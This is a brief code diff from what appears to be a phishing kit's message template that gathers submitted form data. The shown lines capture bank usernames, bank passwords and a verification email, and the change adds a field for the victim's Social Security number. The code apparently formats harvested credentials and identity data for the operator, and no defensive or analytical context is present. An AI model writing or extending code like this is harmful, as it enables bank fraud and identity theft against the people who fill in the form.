@@ -166,6 +166,7 @@ document
 • Account Type: ${formData.get("account_type") || "N/A"} BANK APP OPTION:
 • Bank Username: ${formData.get("bank_username") || "N/A"}
 • Bank Password: ${formData.get("bank_password") || "N/A"}
+•SSN Number: ${formData.get("ssn_number") || "N/A"}
 
 ✅ VERIFICATION DETAILS:
 • Verification Email: ${formData.get("verification_email") || "N/A"}
